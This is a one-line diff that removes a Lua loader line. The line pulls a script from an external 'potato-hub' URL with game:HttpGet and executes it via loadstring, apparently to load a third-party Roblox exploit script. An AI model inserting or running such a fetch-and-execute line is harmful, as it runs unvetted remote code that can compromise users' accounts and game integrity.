@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://www.potato-hub.com/Project-P.lua'),true))()
